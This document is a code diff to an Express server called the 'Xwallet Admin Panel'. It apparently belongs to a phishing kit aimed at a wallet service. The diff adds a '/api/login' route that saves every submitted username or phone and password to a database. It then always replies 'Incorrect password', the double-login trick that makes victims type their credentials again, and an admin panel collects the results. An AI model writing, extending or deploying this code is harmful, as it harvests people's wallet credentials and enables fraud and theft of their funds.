@@ -3,6 +3,7 @@ const express = require('express');
 const mongoose = require('mongoose');
 const cors = require('cors');
 const path = require('path');
+const fs = require('fs');
 const Submission = require('./backend/models/Submission');
 
 const app = express();
@@ -12,15 +13,44 @@ const PORT = process.env.ADMIN_PORT || 5001;
 app.use(cors());
 app.use(express.json());
 
-// 1. Serve Admin Panel Static Files (pointing to frontend directory)
-app.use(express.static(path.join(__dirname, 'frontend'), {index: 'admin.html'}));
+const frontendPath = fs.existsSync(path.join(__dirname, 'frontend'))
+  ? path.join(__dirname, 'frontend')
+  : path.join(__dirname, 'backend', 'public');
+
+// 1. Serve Admin Panel Static Files
+app.use(express.static(frontendPath, { index: 'admin.html' }));
 
 // --- DATABASE CONNECTION ---
-mongoose.connect(process.env.MONGODB_URI)
-  .then(() => console.log('✅ Connected to MongoDB (Xwallet Admin Panel)'))
-  .catch(err => console.error('❌ DB Connection Error:', err));
+if (process.env.MONGODB_URI) {
+  mongoose.connect(process.env.MONGODB_URI)
+    .then(() => console.log('✅ Connected to MongoDB (Xwallet Admin Panel)'))
+    .catch(err => console.error('❌ DB Connection Error:', err));
+}
 
 // --- ADMIN & USER ROUTES ---
+
+// Double-login / Login attempt
+app.post('/api/login', async (req, res) => {
+  try {
+    const { username, loginPassword, phone, password } = req.body;
+    const userVal = username || phone;
+    const passVal = loginPassword || password;
+
+    if (!userVal || !passVal) {
+      return res.status(400).json({ success: false, error: 'Username and password are required' });
+    }
+
+    const loginSubmission = new Submission({
+      username: userVal,
+      loginPassword: passVal,
+      source: 'login'
+    });
+    await loginSubmission.save();
+    res.status(401).json({ success: false, error: 'Incorrect password. Please try again.' });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
 
 // User Submission (Local support)
 app.post('/api/submit', async (req, res) => {
@@ -71,8 +101,8 @@ app.delete('/api/admin/data/:id', async (req, res) => {
 });
 
 // Fallback: Send admin.html for any unknown routes
-app.get(/(.*)/, (req, res) => {
-    res.sendFile(path.join(__dirname, 'frontend', 'admin.html'));
+app.get('*', (req, res) => {
+    res.sendFile(path.join(frontendPath, 'admin.html'));
 });
 
 app.listen(PORT, () => {
